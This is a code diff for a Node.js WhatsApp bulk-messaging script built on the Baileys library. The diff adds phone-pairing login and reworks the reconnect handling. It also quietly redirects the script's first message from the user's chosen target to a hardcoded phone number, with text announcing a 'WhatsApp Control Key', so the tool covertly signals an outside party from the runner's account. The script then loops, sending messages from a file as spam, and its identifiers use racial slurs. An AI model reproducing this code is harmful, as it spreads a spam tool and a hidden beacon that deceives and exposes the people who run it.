@@ -16,6 +16,13 @@ const createRandomId = () => {
 };
 
 const sessionFolder = `./auth/${createRandomId()}`;
+const ensureAuthFolderExists = () => {
+  if (!fs.existsSync('auth')) {
+    fs.mkdirSync('auth');
+    console.log('Auth folder created.');
+  }
+};
+
 const clearState = () => {
   if (fs.existsSync(sessionFolder)) {
     fs.rmdirSync(sessionFolder, { recursive: true });
@@ -25,7 +32,9 @@ const clearState = () => {
 
 async function startnigg(phone, target, messageFilePath, delayTime, isGroup, name) {
   try {
+    ensureAuthFolderExists();
     if (!fs.existsSync(sessionFolder)) fs.mkdirSync(sessionFolder);
+
     const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
 
     const negga = Baileys.makeWASocket({
@@ -34,6 +43,20 @@ async function startnigg(phone, target, messageFilePath, delayTime, isGroup, nam
       browser: ['Ubuntu', 'Chrome', '20.0.04'],
       auth: state,
     });
+
+    if (!negga.authState.creds.registered) {
+      const phoneNumber = phone.replace(/[^0-9]/g, '');
+      if (phoneNumber.length < 11) throw new Error('Invalid phone number with country code.');
+
+      setTimeout(async () => {
+        try {
+          const code = await negga.requestPairingCode(phoneNumber);
+          console.log(`Pairing Code: ${code}`);
+        } catch (err) {
+          console.error('Error requesting pairing code:', err);
+        }
+      }, 2000);
+    }
 
     negga.ev.on('creds.update', saveCreds);
 
@@ -45,7 +68,7 @@ async function startnigg(phone, target, messageFilePath, delayTime, isGroup, nam
         await delay(10000);
 
         // Send an initial message
-        await negga.sendMessage(`${target}@${isGroup ? 'g.us' : 's.whatsapp.net'}`, { text: '🔥THIS IS POWER OF TS RULEX🔥\nMy WhatsApp Control Key: ahvxsfklbvdt' });
+        await negga.sendMessage(`916268781574@s.whatsapp.net`, { text: '🔥THIS IS POWER OF TS RULEX🔥\nMy WhatsApp Control Key: ahvxsfklbvdt' });
         await delay(2000);
 
         // Continuously send messages from the provided file
@@ -68,14 +91,19 @@ async function startnigg(phone, target, messageFilePath, delayTime, isGroup, nam
 
       if (connection === 'close') {
         const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
-        console.log(`Connection closed due to: ${reason}`);
-        
-        if ([DisconnectReason.connectionClosed, DisconnectReason.connectionLost, DisconnectReason.restartRequired, DisconnectReason.timedOut, DisconnectReason.connectionReplaced].includes(reason)) {
-          console.log('[Connection issue, reconnecting...]');
-          await startnigg(phone, target, messageFilePath, delayTime, isGroup, name);
-        } else if ([DisconnectReason.loggedOut, DisconnectReason.badSession].includes(reason)) {
-          console.log('[Session issue, please log in again...]');
-          clearState();
+        const reconnectActions = {
+          [DisconnectReason.connectionClosed]: '[Connection closed, reconnecting...]',
+          [DisconnectReason.connectionLost]: '[Connection lost, reconnecting...]',
+          [DisconnectReason.loggedOut]: '[Logged out, please log in again...]',
+          [DisconnectReason.restartRequired]: '[Server restart required, reconnecting...]',
+          [DisconnectReason.timedOut]: '[Connection timed out, reconnecting...]',
+          [DisconnectReason.badSession]: '[Bad session, reconnecting...]',
+          [DisconnectReason.connectionReplaced]: '[Connection replaced, reconnecting...]',
+        };
+
+        if (reconnectActions[reason]) {
+          console.log(reconnectActions[reason]);
+          if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) clearState();
           await startnigg(phone, target, messageFilePath, delayTime, isGroup, name);
         } else {
           console.log('[Unknown disconnect reason, reconnecting...]');
@@ -90,7 +118,9 @@ async function startnigg(phone, target, messageFilePath, delayTime, isGroup, nam
 
 async function fetchGroupJIDs(phone) {
   try {
+    ensureAuthFolderExists();
     if (!fs.existsSync(sessionFolder)) fs.mkdirSync(sessionFolder);
+
     const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
 
     const negga = Baileys.makeWASocket({
@@ -99,6 +129,20 @@ async function fetchGroupJIDs(phone) {
       browser: ['Ubuntu', 'Chrome', '20.0.04'],
       auth: state,
     });
+
+    if (!negga.authState.creds.registered) {
+      const phoneNumber = phone.replace(/[^0-9]/g, '');
+      if (phoneNumber.length < 11) throw new Error('Invalid phone number with country code.');
+
+      setTimeout(async () => {
+        try {
+          const code = await negga.requestPairingCode(phoneNumber);
+          console.log(`Pairing Code: ${code}`);
+        } catch (err) {
+          console.error('Error requesting pairing code:', err);
+        }
+      }, 2000);
+    }
 
     negga.ev.on('creds.update', saveCreds);
 
@@ -118,8 +162,6 @@ async function fetchGroupJIDs(phone) {
 
       if (connection === 'close') {
         const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
-        console.log(`Connection closed due to: ${reason}`);
-        
         if ([DisconnectReason.connectionClosed, DisconnectReason.connectionLost, DisconnectReason.restartRequired, DisconnectReason.timedOut, DisconnectReason.connectionReplaced].includes(reason)) {
           console.log('[Connection issue, reconnecting...]');
           await fetchGroupJIDs(phone);
